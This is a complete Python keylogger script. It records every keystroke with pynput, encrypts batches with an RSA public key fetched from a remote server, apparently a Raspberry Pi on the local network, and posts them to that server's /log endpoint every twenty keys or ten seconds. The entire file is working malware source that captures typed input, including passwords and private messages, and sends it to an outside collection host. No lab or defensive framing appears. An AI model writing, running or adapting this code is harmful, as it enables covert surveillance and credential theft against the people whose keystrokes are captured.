from pynput import keyboard
import requests
import time
import base64
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, serialization

# Server details
SERVER_IP = "192.168.1.XXX"  # Replace with your Raspberry Pi IP address
SERVER_PORT = 5000
SERVER_URL = f"http://{SERVER_IP}:{SERVER_PORT}"

# Buffer to store keystrokes
keystroke_buffer = []
last_send_time = time.time()

# Get the public key from server
def get_public_key():
    try:
        response = requests.get(f"{SERVER_URL}/public_key")
        if response.status_code == 200:
            public_key_pem = response.content
            public_key = serialization.load_pem_public_key(public_key_pem)
            return public_key
        else:
            print(f"Error getting public key: {response.status_code}")
            return None
    except Exception as e:
        print(f"Error connecting to server: {e}")
        return None

# Encrypt data with public key
def encrypt_data(data, public_key):
    data_bytes = data.encode('utf-8')
    encrypted_bytes = public_key.encrypt(
        data_bytes,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    encrypted_b64 = base64.b64encode(encrypted_bytes).decode('ascii')
    return encrypted_b64

# Send keystrokes to server
def send_keystrokes(keystrokes, public_key):
    if not keystrokes or not public_key:
        return False
    
    try:
        keystrokes_str = ''.join(keystrokes)
        encrypted_data = encrypt_data(keystrokes_str, public_key)
        
        response = requests.post(
            f"{SERVER_URL}/log",
            json={"data": encrypted_data},
            headers={"Content-Type": "application/json"}
        )
        
        if response.status_code == 200:
            return True
        else:
            print(f"Error sending data: {response.status_code}")
            return False
    except Exception as e:
        print(f"Error sending data: {e}")
        return False

# Process keypress
def on_press(key):
    global keystroke_buffer, last_send_time
    
    try:
        # Get character representation of the key
        if hasattr(key, 'char'):
            keystroke_buffer.append(key.char)
        else:
            # Handle special keys
            key_name = str(key).replace('Key.', '<')
            keystroke_buffer.append(f"{key_name}>")
        
        # Send keystrokes in batches or after a time threshold
        current_time = time.time()
        if len(keystroke_buffer) >= 20 or (current_time - last_send_time) > 10:
            if send_keystrokes(keystroke_buffer, public_key):
                keystroke_buffer = []
                last_send_time = current_time
    
    except Exception as e:
        print(f"Error processing keystroke: {e}")

# Initialize the keylogger
if __name__ == "__main__":
    # Get the public key first
    public_key = get_public_key()
    
    if not public_key:
        print("Failed to get public key from server. Exiting.")
        exit(1)
    
    print("Keylogger started. Press Ctrl+C to exit.")
    
    # Start the listener
    with keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            # Send any remaining keystrokes
            if keystroke_buffer:
                send_keystrokes(keystroke_buffer, public_key)
            print("Keylogger stopped.")
